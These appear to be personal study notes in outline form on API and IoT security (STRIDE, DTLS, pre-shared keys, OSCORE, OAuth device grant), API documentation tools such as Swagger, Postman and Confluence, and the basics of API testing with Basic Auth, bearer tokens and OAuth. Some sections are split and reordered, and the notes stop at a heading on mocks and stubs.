		○ Firewall → Load balancer → Reverse proxy/API gateway → App servers

		○ Extras: WAF, IDS/IPS. Gateways often do TLS termination, auth, and rate-limits, but bad app design can still undermine them.

	• Elements to define before building

		○ Assets: data (PII, credentials), systems, logs, even session cookies/keys.

		○ Security goals (NFRs): CIA triad—Confidentiality, Integrity, Availability—plus accountability, privacy, non-repudiation.

		○ Environment \& threat model: which attackers matter here? Use dataflow diagrams and trust boundaries to reason about risk.

		○ Threat categories: STRIDE = Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege.

	• Core mechanisms you’ll apply

		○ Encryption

			• In transit: TLS/HTTPS; hides and integrity-protects traffic.

					® At rest: database/filesystem encryption (context-dependent).

		○ Identification \& Authentication

					® Why: accountability, authorization decisions, DoS mitigation.

			• Factors: something you know (password), have (security key/app), are (biometrics). Prefer MFA/2FA.

		○ Authorization / Access control

					® Identity-based: who you are → what you can do (roles/policies).

					® Capability-based: what this unforgeable token lets you do (fine-grained, delegable).

				□ Audit logging

					® Record who/what/when/where/outcome; protect logs from tampering; mind PII.

				□ Rate-limiting \& quotas

				□ Preserve availability and absorb spikes/DoS; throttle or reject before resources are exhausted; often implemented at the gateway/LB.

	• Design \& testing mindset

		○ Don’t judge ops in isolation; compositions can be insecure (e.g., deposit + withdrawal vs a single atomic transfer).

		○ Turn abstract goals into testable constraints; iterate as new assets/assumptions emerge.

		○ There’s no absolute security; make context-appropriate trade-offs (e.g., GDPR/PII obligations, breach reporting).

	• Analogy mapping (driving test story → API concepts)

		○ Recognizing Alice vs showing a license → identification vs authentication levels.

		○ Train ticket / club celebrity / house keys → authorization models and delegation scope.

		○ CCTV footage → audit logs (accountability, non-repudiation).

	• Quick checklist to apply

		○ List assets (incl. credentials, tokens, logs).

		○ Decide goals (CIA + accountability/privacy).

		○ Draw a dataflow diagram; mark trust boundaries.

		○ Enumerate threats with STRIDE.

		○ Enforce TLS everywhere; plan for at-rest encryption as needed.

		○ Choose auth (with MFA) and authz (roles/capabilities).

		○ Implement audit logging (tamper-resistant).

		○ Add rate-limits/quotas and input size/time guards.

		○ Validate end-to-end flows (not just endpoints).

		○ Revisit the model regularly; update tests and controls.

#### Securing IoT Communications



Main Idea

	• Securing IoT communication needs different choices than classic web APIs because devices are constrained, often use UDP, hop across heterogeneous networks, and face physical/nonce/entropy pitfalls. Use DTLS (or emerging QUIC) thoughtfully, prefer cipher suites and message formats that fit constrained hardware, add end-to-end protection above transport, and manage keys for scale and forward secrecy.

	• Why TLS “as usual” doesn’t fit IoT

		○ Constrained nodes: tiny CPU/RAM/flash/battery.

		○ UDP \& small packets: CoAP/UDP, multicast, sleep cycles.

		○ Protocol gateways: BLE/Zigbee → MQTT/HTTP breaks pure end-to-end TLS.

		○ Physical/side-channel risks and weak randomness sources.

	• Transport-layer security (DTLS/QUIC)

		○ DTLS = TLS for UDP. Same guarantees, but packets can reorder/replay; needs app-level handling.

		○ Java note: DTLS via low-level SSLEngine (handshake states: NEED\_WRAP/UNWRAP/TASK); higher-level libs (e.g., CoAP stacks) hide this.

		○ QUIC/HTTP-3: UDP with built-in TLS 1.3; promising for low-latency IoT but not yet ubiquitous.

	• Cipher suites for constrained devices

		○ Avoid AES-GCM with DTLS on constrained gear (easy to misuse nonces; catastrophic if reused).

		○ Prefer:

			§ ChaCha20-Poly1305 (fast, small, software-friendly).

			§ AES-CCM (good with AES hardware; choose 128-bit tag; avoid \_CCM\_8 unless bytes are critical + strong compensations).

		○ Favor forward secrecy (ECDHE) when you can; TLS 1.3 removes weak key exchanges.

		○ Consider raw public keys (DTLS RFC 7250) to ditch X.509 parsing on devices.

	• Pre-Shared Keys (PSK)

		○ Why: remove cert/signature code; huge footprint savings.

		○ Rules: PSKs must be strong random keys (≥128-bit); never passwords (offline guessing).

		○ Flavors:

			§ Raw PSK (no FS) → simplest, but past sessions fall if key leaks.

			§ PSK + (EC)DHE → adds forward secrecy with moderate cost.

		○ Server must map PSK identity → device identity.

	• End-to-end (E2E) security above transport

		○ Transport (TLS/DTLS) protects each hop; gateways still see plaintext. Add message-level AEAD:

			§ COSE over CBOR for IoT (JOSE/JSON analogs).

			§ Use HKDF to derive per-message keys and bind context (sender/receiver IDs, message type, direction) to stop replay/reflection.

			§ Pragmatic alternative: NaCl/libsodium (SecretBox/CryptoBox) for fixed, safe primitives with simple APIs.

		○ Nonces \& misuse resistance

			§ Constrained devices often have poor randomness → nonce reuse risk.

			§ Safer AE modes:

				□ SIV-AES (MRAE): tolerates repeated nonces without total failure (still aim for unique nonces; include random IV as associated data). Needs only AES-ENC (good for HW).

	• Key distribution \& lifecycle

		○ Provisioning: per-device keys at manufacture (in ROM/secure element) or derive from master via HKDF using device IDs.

		○ Key distribution servers: enroll device, rotate keys periodically; can piggyback on OAuth2/JWT/CBOR tokens.

		○ Ratcheting: symmetric key evolution (e.g., HKDF or AES-CTR with reserved IV) for forward secrecy over time.

		○ Post-compromise security: best with hardware (TPM/TEE/secure element) or occasional ephemeral DH mixes; hard to guarantee if attacker stays in the loop.

	• Threats \& hardening notes

		○ Side-channel/fault attacks: prefer constant-time primitives (ChaCha20), secure elements, certifications (FIPS/CC).

		○ Replay/rate-limit: timestamps/counters, strict API rate limits (esp. with short MAC tags).

		○ Identity binding: include sender/receiver identities and context in AEAD associated data.

	• Key terms

		○ DTLS: TLS for UDP.

		○ Constrained device: tight CPU/RAM/energy/connectivity.

		○ PSK: pre-shared symmetric key; mutual auth.

		○ COSE/CBOR: JOSE/JSON’s compact binary siblings.

		○ MRAE / SIV-AES: misuse-resistant AE; resilient to nonce reuse.

		○ Ratcheting: one-way key updates for forward secrecy.

	• Practical checklist

		○ If you use UDP, use DTLS (or QUIC where it fits).

		○ Pick ChaCha20-Poly1305 (default) or AES-CCM (with AES HW).

		○ Avoid AES-GCM on DTLS unless you are 100% sure about nonces.

		○ Use raw public keys or PSK to cut code size; add (EC)DHE if you can for FS.

		○ Add message-level E2E AEAD (COSE or NaCl) across gateways.

		○ HKDF per-message keys + context binding; include anti-replay (counters/timestamps).

		○ Rotate keys via ratchets; plan secure provisioning and distribution.

		○ Consider secure elements/TEE for tamper resistance and post-compromise recovery.





#### Securing IoT APIs



Main Ideas

	• IoT APIs must authenticate devices (not just users), prove freshness to stop replays, fit OAuth2 to constrained UX/hardware, and continue making local auth decisions when offline. Use transport-layer auth when you can; otherwise add end-to-end request auth with replay defenses. For consumer IoT, use the OAuth device grant; for deeply constrained stacks, use ACE-OAuth with PoP tokens.

	• Device identity \& transport-layer auth

		○ Device profiles: store device\_id, make/model, and an encrypted PSK (or public key). Create during manufacturing/onboarding.

		○ Device “certificates” without PKI: signed JWT/CWT holding device attributes + encrypted PSK the API can decrypt.

		○ TLS/DTLS PSK auth: client sends PSK identity in handshake; server looks up device profile → decrypts PSK → mutual auth.

			§ Only trust the PSK ID after the handshake (it’s authenticated then).

			§ Expose device identity to the app layer to drive authorization.

	• End-to-end authentication (beyond transport)

		○ Gateways break pure end-to-end TLS; add message-level auth (COSE/NaCl) so only API can open/verify the request.

		○ Entity authentication = message authentication + freshness.

			§ Freshness options:

				□ Timestamps (weakest; allow windowed replays).

				□ Unique nonces / counters (server stores seen nonces / highest counter).

				□ Challenge–response (server sends nonce; strongest, extra round trip).

		○ Beware delay/reorder attacks (not just replay).

	• OSCORE in one glance (end-to-end for CoAP)

		○ Uses PSK + COSE to protect CoAP end-to-end.

		○ Maintains a security context:

			§ Common: Master Secret (+ optional Salt), algorithms, Common IV (all via HKDF).

			§ Sender: Sender ID, Sender Key, sequence number (Partial IV).

			§ Recipient: Recipient ID/Key, replay window.

		○ Nonces = function(Common IV, Sender ID, sequence#). Deterministic → store state reliably to avoid nonce reuse.

		○ Messages are COSE\_Encrypt0; Sender ID + Partial IV go in (unprotected) headers but are authenticated via external AAD.

		○ Recipient tracks replay (window) or rely on sticky routing/synchronized state across servers.

	• Replay-safe REST patterns

		○ Idempotency helps but isn’t sufficient by itself.

### API Documentation

#### API Foundations



What is an API?

	• An API (Application Programming Interface) is a middle layer that enables communication and interaction between two applications, systems, or programs. It allows developers to reuse existing functionality and data instead of building everything from scratch.

	• Key Concepts

		○ Definition of API

			§ Stands for Application Program Interface.

			§ Serves as an interface between two programs or systems.

			§ Can be software that connects applications.

		○ Purpose of APIs

			§ Organizations expose data or functionality publicly via endpoints.

			§ Developers can pull and integrate that data into their own applications.

			§ Promotes reuse of existing capabilities instead of duplicating effort.

		○ How APIs Work

			§ Example flow:

				□ Database ↔ Web Server ↔ API ↔ Web Application ↔ User (Internet)

			§ APIs handle requests from one application and deliver a response after interacting with servers and databases.

		○ Examples

			§ Stock prices: An app can fetch real-time stock data from another application’s API.

			§ Weather apps: When checking the weather, the app sends a request to a web server through an API, which fetches data from a database and returns it.

		○ Request–Response Model

			§ Request: Sent by the client application (e.g., stock app asking for prices).

			§ Response: Returned by the API after fetching/processing the requested data.

		○ Modern Relevance

			§ APIs are essential in today’s world for interoperability, integration, and efficiency.

			§ Many organizations rely on APIs provided by others instead of reinventing similar functionality.



Types of APIs

	• APIs, specifically web APIs (using HTTP), can be classified into four main types—Open, Partner, Internal, and Composite—based on access levels and scope of use. Each type serves a distinct purpose and has different implications for security, accessibility, and performance.

	• Key Concepts

		○ Open (Public) APIs

			§ Also called External APIs.

			§ Available for anyone to use (with little or no authentication).

			§ Can be free or subscription-based (depending on usage volume).

			§ Business advantage: Wider reach, more developers use their services, increased value of their APIs.

			§ Developer advantage: Easy access to data with minimal restrictions.

		○ Partner APIs

			§ Restricted to specific partners/business collaborators.

			§ Requires stronger authentication (e.g., license keys, secure tokens).

			§ Business advantage: More control over how data is shared/used and with whom.

			§ Used to strengthen business collaborations.

		○ Internal (Private) APIs

			§ Not for public use—restricted to internal systems within an organization.

			§ Enable communication between internal systems and applications.

			§ Useful when new systems are integrated with existing infrastructure.

			§ Advantage: Keeps internal workflows and data secure and organized.

		○ Composite APIs

			§ Bundle multiple API requests into one, returning a single response.

			§ Useful when data needs to be fetched from multiple servers or sources.

			§ Advantages:

				□ Reduces number of calls (less server load).

				□ Improves speed and performance.

#### API Documentation



What is API Documentation?

	• API documentation is like a user manual for an API. Even the best API is ineffective without proper documentation. Good documentation ensures developers understand, integrate, and use the API efficiently, ultimately leading to higher consumer satisfaction.

	• Key Concepts

		○ Purpose of API Documentation

			§ Explains the complete functionality of the API.

			§ Serves as a guide/manual for developers.

			§ Provides consumer satisfaction by making the API easy to use.

		○ What It Should Include

			§ Purpose of the API: What it is designed to do.

			§ Inputs/parameters: What needs to be passed for proper usage.

			§ Integration details: How to connect and use the API effectively.

			§ Best practices: The most efficient way to use the API.

			§ Examples and tutorials: Practical demonstrations that improve understanding.

		○ Benefits of Good Documentation

			§ Helps developers quickly and effectively use the API.

			§ Enhances analytical skills of developers by providing real-world examples.

			§ Improves integration speed and reduces errors.

			§ Leads to better adoption of the API.

		○ Ways to Create Documentation

			§ Written manually (detailed custom documentation).

			§ Generated using automation tools (to speed up creation and maintenance).

		○ Importance in API Lifecycle

			§ Documentation is a crucial phase in the API development lifecycle.

			§ Without it, even a powerful API may go unused.



Importance of API Documentation

	• Good API documentation is essential for adoption, usability, and long-term success of APIs. It acts like an instruction manual, saving time, reducing costs, improving developer experience, and increasing the popularity of APIs.

	• Key Concepts

		○ Ease of Use for Developers

			§ Developers prefer APIs with clear instructions so they can quickly integrate them.

			§ Good documentation makes APIs easy to plug into applications without guesswork.

			§ Reduces frustration and increases consumer satisfaction.

		○ Technology Independence

			§ Documentation should be understandable by anyone, even without a deep technical background.

			§ Makes APIs accessible to a wider audience.

		○ Faster Onboarding

			§ New developers can get started quickly by following documentation.

			§ Saves time during training and ramp-up phases.

		○ Time and Cost Savings

			§ Clear documentation reduces the need for direct support from API providers.

			§ Consumers can self-serve answers to questions.

			§ Saves money for both providers and consumers.

		○ Easy Maintainability

			§ Good documentation includes details like requests, responses, and integrations.

			§ This makes maintenance, debugging, and updates much easier.

		○ Popularity and Adoption

			§ Well-documented APIs are more likely to gain widespread adoption.

			§ High consumer satisfaction leads to word-of-mouth popularity.

			§ Many of the most popular public APIs succeed because of excellent documentation.



#### Components of API Documentation



Name, Description, and Endpoints

	• Clear and well-structured API documentation components—such as name, description, and endpoints—are critical for helping developers understand and use an API effectively. These elements provide context, usability, and technical entry points.

	• Key Concepts

		○ Name

			§ Should be meaningful and self-explanatory.

			§ Provides a gist of the API’s purpose even without reading the description.

			§ Example: An API named Product immediately signals it deals with product-related data.

		○ Description

			§ Explains how the API can be used in real-world scenarios.

			§ Focuses on business use cases, not just technical details.

			§ Example: For a sports store API, the description might say it provides details of all products in the store.

			§ Can include subsections for specific functionality, like Product by ID or Product by Name, each with its own description.

		○ Endpoints

			§ One of the most important parts of API documentation.

			§ Endpoints are essentially URLs that define where and how the API communicates with systems.

			§ Each touchpoint in communication is considered an endpoint.

			§ Documentation usually provides:

				□ Base URL at the top (common to all calls).

				□ Specific endpoints for different actions (only the changing parts are listed separately).



Authorization, Parameters, and Headers

	• API documentation must clearly include authorization/authentication methods, parameters, and headers, as these are critical for controlling access, structuring API calls, and providing additional context in communication between clients and servers.

	• Key Concepts

		○ Authorization \& Authentication

			§ Authentication: Identifies who can access the API.

			§ Authorization: Determines what actions the authenticated user can perform.

			§ Analogy: Authentication = showing ID, Authorization = what access rights that ID grants.

			§ Common types of API authentication:

				□ None: No authentication (e.g., for internal APIs).

				□ Basic Auth: Username \& password sent with each API call.

				□ API Key Auth: Long, unique tokens sent with each call.

				□ OAuth: Auto-approves and securely manages developer access.

			§ Documentation requirement: Must specify the type of authorization, what’s needed (username, password, token, etc.), and how to provide it.

		○ Parameters

			§ Represent the variable part of a resource in an API call.

			§ Consist of name + value pairs.

			§ Can be required (must be provided for the API to work) or optional (used for filtering, refining results, etc.).

			§ Documentation requirement:

				□ List all parameters.

				□ Describe their purpose and usage.

				□ Clearly mark whether each is required or optional.

		○ Headers

			§ Similar to parameters, using key–value pairs.

			§ Carry metadata about the request (e.g., content type, authorization tokens, caching directives).

			§ Sent along with requests to help servers interpret or validate the call.

			§ Documentation requirement: Must include all headers used, their purpose, and example values.



Request and Response

	• API documentation must clearly explain the request and response structure, including attributes, examples, and error/success codes. Well-written, simple, and interactive documentation improves usability and developer experience.

	• Key Concepts

		○ Request Body

			§ Contains attributes with assigned values that are required to make an API call.

			§ Each attribute should have a short description explaining its purpose.

			§ Documentation should clearly list all attributes that make up the request body.

		○ Response Body

			§ Shows the output returned after sending a request.

			§ Documentation should include example responses so consumers know what to expect.

		○ Success and Error Codes

			§ Must list possible status codes (e.g., 200 OK, 400 Bad Request, 401 Unauthorized, 500 Server Error).

			§ Each code should have a short explanation of its meaning.

			§ Helps developers troubleshoot and handle errors properly.

		○ Best Practices for Documentation

			§ Keep language simple and easy to understand.

			§ Organize content well; avoid unnecessary technical jargon.

			§ Prefer auto-generated documentation to stay up to date with the latest API changes.

			§ Provide interactive features (e.g., “Try it out” options) to let developers test API calls directly.



#### Integrating Documentation with API Tools



Swagger

	• Swagger is one of the most popular tools for creating API documentation. Its strength lies in auto-generating documentation from code, keeping it up to date, and making it interactive so developers can try out APIs directly.

	• Key Concepts

		○ Autogenerated Documentation

			§ Swagger can generate documentation directly from code.

			§ Ensures the documentation is always current with the latest changes.

			§ Saves time and effort compared to writing docs manually.

		○ User-Friendly Interface

			§ Swagger UI (example: petstore.swagger.io) is clean and well-organized.

			§ Uses color coding for HTTP methods:

				□ GET → Blue

				□ POST → Green

				□ PUT → Yellow

				□ DELETE → Red

			§ Endpoints are expandable/collapsible, making navigation easier.

		○ Comprehensive Endpoint Details

			§ Expanding an endpoint shows:

				□ Parameters

				□ Request body

				□ Example values

				□ Success \& error codes

			§ All previously discussed API documentation components (name, description, parameters, headers, request/response, etc.) are included.

		○ Interactivity ("Try it out")

			§ Developers can execute API calls directly in the documentation.

			§ Example: Adding a new pet → sending request with attributes (ID, category, name, etc.) → getting a live response (200 success).

			§ Ability to test endpoints like "Find pet by ID" demonstrates real-time functionality.

		○ Consumer Benefits

			§ Makes documentation hands-on and engaging.

			§ Helps developers quickly see how an API works and decide if it fits their use case.

			§ Reduces onboarding time and increases consumer satisfaction.



Postman

	• Postman is widely known as an API testing tool, but it also has strong built-in features for generating API documentation. It allows documentation at both the individual request level and the collection level, making it easy to provide comprehensive API reference material.

	• Key Concepts

		○ Documentation for Individual Requests

			§ Each API request in Postman (e.g., a GET request) can have its own attached documentation.

			§ Accessed via a paper icon on the right side of the request.

			§ Displays complete details of the request: method, parameters, headers, etc.

		○ Documentation for Entire Collections

			§ Postman supports documenting not just single requests but the whole collection of related API calls.

			§ Users can generate and view full API documentation with a single link.

			§ The collection-level docs show:

				□ Endpoints

				□ Descriptions

				□ Parameters \& headers

				□ Authorization details

				□ Request \& response body

				□ Success and error codes

		○ Code Snippets

			§ Postman offers the ability to add code snippets in different programming languages.

			§ This feature helps developers see how to call the API directly in their preferred language.

		○ Strengths of Postman Documentation

			§ Combines API testing + documentation in one tool.

			§ Documentation is integrated and updated alongside API requests.

			§ Provides a clear, structured view for developers to understand how APIs work.



Confluence

	• Confluence is a strong tool for documenting internal APIs, especially those shared across teams. It allows manual organization of API documentation into structured pages (objects, endpoints, attributes, etc.), but it can also leverage OpenAPI specs for automated, interactive documentation.

	• Key Concepts

		○ Use Case

			§ Best suited for internal API documentation shared within teams.

			§ Helps organize API knowledge in a collaborative workspace.

		○ Structure in Confluence

			§ Pages per object: Each API object (e.g., Product) gets its own page.

			§ Endpoints: Listed under the object with links to details.

				□ Examples: Get all products, Add new product, Fetch product by ID.

			§ Attributes: Documented with details such as:

				□ Data type

				□ Required/optional

				□ Short description

			§ Endpoint Documentation

				□ Each endpoint (e.g., POST for creating a product) includes:

					® Short description of functionality

					® Endpoint URL

					® Parameters and headers (with required/optional tags)

					® Success and error codes, with explanations and possible solutions

					® Example request and response bodies

					® Code snippets in multiple programming languages

		○ Manual vs. Automated Documentation

			§ Typically documentation is manually created in Confluence.

			§ But if an OpenAPI spec (JSON/YAML) is available, Confluence can support auto-generated interactive documentation.

		○ Other Tools

			§ Besides Confluence, other API documentation tools include:

				□ Redocly

				□ Stoplight

				□ ReadMe

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 		○ Use precondition headers with ETags:

			§ Update: If-Matches (reject with 412 if the stored ETag changed).

			§ Create: If-None-Match: \* to prevent overwriting newer versions.

		○ Last-Modified / If-Unmodified-Since also work (coarser granularity).

		○ For end-to-end paths, embed headers + method + body into an encrypted request object (e.g., CBOR + CryptoBox). On receipt:

			§ Decrypt \& verify.

			§ Enforce that actual HTTP method/headers match the request object (don’t let objects override transport metadata).

	• OAuth2 adapted to IoT

		○ Device Authorization Grant (device flow):

			§ Device starts flow → gets device\_code, short user\_code, verification\_uri.

			§ Shows user\_code/QR to user; user approves on phone/PC.

			§ Device polls token endpoint; handles authorization\_pending, slow\_down, access\_denied, expired\_token.

		○ ACE-OAuth (OAuth for constrained envs):

			§ CoAP + CBOR + COSE; PoP tokens by default (bound to symmetric or public keys).

			§ Tokens in CWT; APIs get key via introspection or from the token; can combine with OSCORE for protecting API traffic.

		○ Offline authentication \& authorization

			§ Offline user auth: provision short-lived credentials the device can verify locally (e.g., one-time codes/QR with stored hash, or signed tokens bound to a key/cert presented over BLE).

			§ Offline authorization:

				□ Periodically sync policies (XACML or lighter custom format).

				□ Use self-contained tokens with scopes or macaroons (add caveats like expiry, geo-fence, time-box; verify locally). Third-party caveats fit IoT well.

		○ Key terms

			§ Device onboarding: registering device + credentials.

			§ Entity authentication: who sent it and that it’s fresh.

			§ OSCORE: COSE-protected CoAP with HKDF-derived context and replay windows.

			§ Request object: method+headers+body packaged and encrypted as one unit.

			§ Device grant: OAuth flow with user\_code on a second screen/device.

			§ ACE-OAuth: OAuth over CoAP/CBOR with PoP tokens.

			§ Macaroons: bearer tokens with verifiable, append-only caveats.

		○ Practical checklist (opinionated)

			§ If device ↔ API is direct, use TLS/DTLS PSK (or client certs); map PSK ID → device profile → authZ.

			§ Crossing gateways? Add COSE/NaCl end-to-end request protection + freshness (prefer challenge–response or counters).

			§ For CoAP ecosystems, adopt OSCORE; plan for state persistence and replay windows.

			§ For REST mutations, require ETag preconditions; include ETag/method inside request objects and enforce match.

			§ Consumer UX: use OAuth device grant. Constrained stacks: plan ACE-OAuth + PoP.

			§ Offline operation: cache policies/tokens; use macaroons or short-lived PoP tokens; limit offline privileges/time.





--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### API Testing

#### Understanding Web Services and APIs



Introduction to Web Services

	• APIs dominate modern internet traffic (roughly 60–80%), and they connect innumerable web services. Testers need to understand and probe these services effectively.

	• Key Concepts

		○ Definitions

			§ Web service (working definition): A function you can access over the web.

				□ Think function → input → processing → output.

			§ API: The interface to send inputs to a service and receive outputs.

			§ Black-box perspective: Treat the service internals as unknown; evaluate behavior purely via inputs/outputs.

			§ Service scope varies:

				□ Tiny, single-purpose endpoints (e.g., a math evaluator like MathJS).

				□ Full applications with many interrelated features.

				□ Internal (owned by your org) vs external (third-party) services.

		○ Testing implications

			§ Use black-box testing techniques: design input cases, observe outputs, infer behavior/bugs without relying on implementation details.

			§ Adjust approach based on service scope (small utility vs complex app) and ownership (internal vs external).

			§ Focus on request/response contracts: inputs, validation, error handling, and output correctness.



Types of APIs

	• different types of APIs—REST, SOAP, and GraphQL—explaining their principles, differences, and practical use cases. It highlights how APIs define the structure of requests and responses, and how developers/testers interact with them.

	• Key Concepts

		○ REST APIs (Representational State Transfer)

			§ Originated from Roy Fielding’s doctoral thesis.

			§ Principles: Simple, consistent, and resource-based design.

			§ Characteristics:

				□ Most common style in modern APIs.

				□ Uses HTTP methods (GET, POST, PUT, DELETE).

				□ Typically returns JSON.

			§ Takeaway: If you’re unsure what type of API you’re working with, REST is the most likely.

		○ SOAP APIs (Simple Object Access Protocol)

			§ Older but still used in many systems.

			§ Highly standardized with rules defined by WSDL (Web Services Description Language).

			§ Uses XML for both requests and responses.

			§ Requires strict request formatting (headers, content types, and body structure).

			§ Requests usually sent with POST.

			§ Takeaway: SOAP enforces consistency but is more rigid and verbose compared to REST.

		○ GraphQL

			§ Created by Facebook (Meta) in 2015, growing in popularity.

			§ Query Language for APIs → gives clients fine-grained control over the data requested.

			§ Features:

				□ Single endpoint (unlike REST which often has many).

				□ Clients specify exactly what data they need → reduces over-fetching/under-fetching.

				□ Example: Request only country name and capital, excluding currency if not needed.

			§ Takeaway: GraphQL is flexible and efficient, letting clients shape the response to their exact needs.

		○ Practical Testing/Usage Notes

			§ REST → easy, common, loosely standardized.

			§ SOAP → structured, XML-based, requires strict adherence to WSDL.

			§ GraphQL → highly flexible, query-driven, single endpoint, selective data retrieval.

		○ Overall Takeaway

			§ There are multiple API paradigms, each with trade-offs:

				□ REST = simplicity and ubiquity.

				□ SOAP = rigid structure and enterprise legacy systems.

				□ GraphQL = flexibility and precision for modern data-driven apps.

#### Getting Started with API Testing



Risk of using Services and APIs

	• API testing is fundamentally about risk reduction. APIs introduce unique risks—such as version changes, availability issues, timing problems, performance bottlenecks, and security vulnerabilities—that testers must anticipate and mitigate.

	• Key Concepts

		○ API Changes

			§ Public APIs: Generally stable, but version upgrades can break existing integrations.

			§ Private APIs: May change frequently without strict versioning (e.g., endpoint names, request/response data), requiring constant test updates.

			§ Any change can introduce bugs even if the interface looks the same.

		○ Availability Risks

			§ Network issues: Flaky internet can impact API reliability.

			§ Permissions: Must enforce correct access control. Testing should check both sides:

				□ Authorized users can access only what they should.

				□ Unauthorized users cannot see restricted data.

		○ Timing Risks

			§ Order of requests: Network glitches or race conditions may cause out-of-order execution.

			§ Slow calls / timeouts: Need to test how APIs handle delays.

			§ Concurrency: Multiple users modifying the same resource simultaneously may lead to conflicts.

		○ Performance Risks

			§ APIs can be hit faster than human-driven UIs since they’re programmatic.

			§ Rate limiting: Prevents abuse by limiting request frequency.

			§ Without rate limiting: Malicious actors or buggy code could overload the system with a spike of requests.

		○ Security Risks

			§ APIs are common attack vectors because they’re easy to interact with via scripts.

			§ Risks include unauthorized access, injection attacks, or denial of service through traffic spikes.

			§ Even if not doing full penetration testing, testers should remain aware of security concerns.

#### API Authorization



Overview of Authorization and Authentication

	• APIs must be secured, and testers need to understand authentication and authorization in order to properly access and test API endpoints. These are distinct but often combined in practice.

	• Key Concepts

		○ API Security Challenges

			§ APIs are exposed to programmatic attacks, so security is critical.

			§ For testers, security adds complexity → must learn how to authenticate and authorize before testing endpoints.

			§ Testers should also validate that the security mechanisms themselves work as intended.

		○ Authentication

			§ Definition: Verifies who you are.

			§ Analogy: Showing an ID at a rental car counter.

			§ Failure case: If your ID doesn’t match you → you fail authentication.

			§ API context: Ensures the requester’s identity is valid (e.g., via username/password, tokens, or certificates).

		○ Authorization

			§ Definition: Verifies what you can do.

			§ Analogy: Even if the ID is valid, if you don’t have a reservation, you’re not allowed to rent the car.

			§ Failure case: Authenticated user but no permission for the requested action.

			§ API context: Controls access rights to specific actions or resources.



Basic Authorization in API calls

	• Basic authentication (Basic Auth) is one of the simplest ways to authenticate with an API. It works by sending a username and password in an Authorization header using Base64 encoding, but it has significant security risks if not used over a secure connection (HTTPS).

	• Key Concepts

		○ Basic Auth Mechanism

			§ Similar to logging into a website with a username and password.

			§ Sent in the Authorization header:

				Authorization: Basic <base64(username:password)>

			§ Example: username=postman, password=password → base64 encoded → placed after the word “Basic”.

		○ Base64 Encoding

			§ Base64 is not encryption, just an encoding scheme.

			§ Easy to decode (trivial for anyone intercepting traffic).

			§ Example shown with decoding a header string to reveal the raw credentials.

			§ Risk: If traffic is not encrypted (no HTTPS), credentials can be stolen easily.

		○ Security Considerations

			§ Must use HTTPS when using Basic Auth to protect credentials in transit.

			§ Avoid sending sensitive credentials in plaintext.

			§ For stronger security, consider more robust authentication methods (OAuth, API keys, tokens, etc.).

		○ Postman Demonstration

			§ Postman automates header creation when using its Authorization tab.

			§ Manual method: User can create their own Authorization header by encoding username:password into Base64 and appending it.

			§ Verified by sending a request and receiving authenticated = true.

		○ General API Call Data Transmission

			§ Data in an API call can be transmitted in three main ways:

				□ URL parameters (query strings).

				□ Request body (payload).

				□ Headers (metadata, including authentication).

			§ Authentication data always travels through one of these channels.



Using Authorization Tokens

	• Instead of using basic authentication, modern APIs often use authorization tokens. Tokens securely combine authentication (who you are) and authorization (what you can do) into one mechanism, making them more flexible and secure for API interactions.

	• Key Concepts

		○ Authorization Tokens

			§ Definition: A server-issued credential proving both identity and permissions.

			§ Anyone presenting the token can perform the actions that token allows.

			§ More secure and flexible than Basic Auth, since tokens can:

				□ Expire (time-limited).

				□ Be scoped to specific actions/endpoints (e.g., read, create, but not delete).

		○ Example: GitHub Personal Access Token

			§ Generated in GitHub Developer Settings.

			§ Can set expiration and scope (permissions) when creating the token.

			§ Example:

				□ Token allowed: read repos, create repos.

				□ Token denied: deleting repos → results in forbidden (403) error.

		○ Bearer Tokens in Practice

			§ Used in Authorization header like:

				Authorization: Bearer <token>

			§ Postman automatically adds this header when configured.

			§ Works similarly to Basic Auth header but much more secure and flexible.

		○ Usage Flow

			§ Generate token from service (GitHub in this case).

			§ Add token to Postman’s Bearer Token field.

			§ Make requests:

				□ GET repos → works (authorized).

				□ POST new repo → works (authorized).

				□ DELETE repo → fails (not authorized, scope excluded).



Finsing Bearer Tokens

	• APIs commonly use tokens for authentication/authorization, but the way you obtain and use these tokens varies across APIs. Testers and developers need to know common patterns, read documentation, and sometimes inspect traffic to figure out how tokens are issued and passed in requests.

	• Key Concepts

		○ How to Get Tokens

			§ Account/Form-based: Many APIs require creating an account or filling out a form to request a token (e.g., IUCN Threatened Species API).

			§ Direct provision: Some APIs provide sample tokens in documentation for testing.

			§ OAuth workflow: Common approach where you exchange a client ID and client secret for a token (e.g., Petfinder API).

		○ How Tokens Are Used in Requests

			§ Query string parameters: Rare, but some APIs place tokens directly in the URL (unusual and less secure).

			§ Headers (most common): Tokens usually passed via the Authorization header as a Bearer token.

			§ Custom headers: Some APIs define their own headers (e.g., X-Api-Key in The Dog API). Prefix X- is common but not required.

		○ Common Patterns in API Token Use

			§ Consistency varies: Each API can implement tokens differently—no universal rule.

			§ Documentation is key: Must read the API docs to know whether the token belongs in the header, body, or URL.

			§ Inspecting network traffic: Developer tools can reveal where tokens are being sent (e.g., Dog API’s X-Api-Key header).

			§ OAuth (Client ID + Secret exchange): A standardized scheme widely adopted for securely issuing tokens.



Setting up Oauth

	• explains how OAuth 2.0 works in practice, using the Imgur API as an example. OAuth is a widely used authentication and authorization framework that enables secure access to APIs (e.g., “Login with Google”). It involves registering an application, obtaining authorization from the user, and exchanging authorization codes for access tokens.

	• Key Concepts

		○ OAuth 2.0 Basics

			§ Purpose: Allows applications to securely access user data without sharing passwords directly.

			§ Common Usage: "Login with Google" or "Login with Facebook."

			§ Mechanism: Uses tokens (not credentials) to authenticate and authorize access.

		○ Registering an Application

			§ Developers must register their app with the API provider (e.g., Imgur).

			§ Registration requires:

				• Application name.

				• Callback/redirect URL (where users are sent after logging in).

				• Client ID and Client Secret (credentials identifying the app).

		○ OAuth Authorization Code Flow

			§ Step 1: Application requests access from the Authorization Server.

			§ Step 2: User is prompted to log in and consent.

			§ Step 3: Authorization server issues a short-lived authorization code.

			§ Step 4: Application exchanges that code at the /token endpoint with its Client ID + Secret to receive an access token.

			§ Step 5: Application uses the access token to call API endpoints on behalf of the user.

		○ Key Terms

			§ Authorization Server: System that validates user identity and issues tokens.

			§ Client ID \& Secret: Identifiers for the app making the request.

			§ Authorization Code: Temporary code proving user consent.

			§ Access Token: Credential allowing the app to interact with the API.

#### Additional API Testing Consideration



Using Mocks, Stubs, and Fakes, in API Testing

